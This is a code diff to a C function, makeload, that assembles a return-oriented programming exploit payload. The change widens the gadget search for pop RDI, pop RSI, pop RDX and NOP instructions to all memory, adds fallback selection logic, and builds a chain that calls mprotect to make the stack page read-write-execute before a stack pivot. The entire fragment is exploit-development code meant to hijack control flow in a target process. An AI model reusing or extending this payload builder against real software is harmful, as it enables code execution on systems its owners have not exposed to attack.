@@ -31,11 +31,17 @@ ssize_t makeload(PayloadPtr plp, BaseAddressesPtr bap, char *p, ssize_t np) {
 	Pointer	fbg_popRDX = searchRegion(bap->regions + rt_basehook, s_popRDX);
 	Pointer	fbg_nopNOP = searchRegion(bap->regions + rt_basehook, s_nopNOP);
 
-	// Things are wrong if I don't find the gadgets in fallbackGadgets()
-	assert(fbg_popRDI != NULL);
-	assert(fbg_popRSI != NULL);
-	assert(fbg_popRDX != NULL);
-	assert(fbg_nopNOP != NULL); // This little guy is only found in fallbackGadgets()
+	// Next, get backup gadgets from fallbackGadgets()
+	Pointer	any_popRDI = searchMemory(s_popRDI);
+	Pointer	any_popRSI = searchMemory(s_popRSI);
+	Pointer	any_popRDX = searchMemory(s_popRDX);
+	Pointer	any_nopNOP = searchMemory(s_nopNOP);
+
+	// Things are wrong if I don't find the gadgets somewhere!
+	assert(any_popRDI != NULL);
+	assert(any_popRSI != NULL);
+	assert(any_popRDX != NULL);
+	assert(any_nopNOP != NULL); // This little guy is only found in fallbackGadgets()
 
 	// We will need "mprotect()"
 	Pointer	libc_mprotect = dlsym(RTLD_NEXT, "mprotect");
@@ -54,19 +60,39 @@ ssize_t makeload(PayloadPtr plp, BaseAddressesPtr bap, char *p, ssize_t np) {
 
 	// ROP Chain
 	ROPChainPtr rcp = &pcp->pc_ROPChain;
-	rcp->rc_popRDI.o    = libc_popRDI?
-				pointerToOffset(libc_popRDI,	'L', bap):
-				pointerToOffset(fbg_popRDI,	'F', bap);
+
+	if (libc_popRDI)
+		rcp->rc_popRDI.o = pointerToOffset(libc_popRDI, 'L', bap);
+	else if (fbg_popRDI)
+		rcp->rc_popRDI.o = pointerToOffset(fbg_popRDI,  'F', bap);
+	else
+		rcp->rc_popRDI.o = pointerToOffset(any_popRDI,  'A', bap);
+		
 	rcp->rc_stackPage.o = pointerToOffset(bap->stack_base,	'S', bap);
-	rcp->rc_popRSI.o    = libc_popRSI?
-				pointerToOffset(libc_popRSI,	'L', bap):
-				pointerToOffset(fbg_popRSI,	'F', bap);
+
+	if (libc_popRSI)
+		rcp->rc_popRSI.o = pointerToOffset(libc_popRSI, 'L', bap);
+	else if (fbg_popRSI)
+		rcp->rc_popRSI.o = pointerToOffset(fbg_popRSI,  'F', bap);
+	else
+		rcp->rc_popRSI.o = pointerToOffset(any_popRSI,  'A', bap);
+		
 	rcp->rc_stackSize   = getpagesize();
-	rcp->rc_popRDX.o    = libc_popRDX?
-				pointerToOffset(libc_popRDX,	'L', bap):
-				pointerToOffset(fbg_popRDX,	'F', bap);
+
+	if (libc_popRDX)
+		rcp->rc_popRDX.o = pointerToOffset(libc_popRDX, 'L', bap);
+	else if (fbg_popRDX)
+		rcp->rc_popRDX.o = pointerToOffset(fbg_popRDX,  'F', bap);
+	else
+		rcp->rc_popRDX.o = pointerToOffset(any_popRDX,  'A', bap);
+		
 	rcp->rc_permission  = 0x7;
-	rcp->rc_nop.o	    = pointerToOffset(fbg_nopNOP,	'F', bap);
+
+	if (fbg_nopNOP)
+		rcp->rc_nop.o = pointerToOffset(fbg_nopNOP,     'F', bap);
+	else
+		rcp->rc_nop.o = pointerToOffset(any_nopNOP,     'A', bap);
+
 	rcp->rc_mprotect.o  = pointerToOffset(libc_mprotect,	'L', bap);
 
 	// Stack pivot
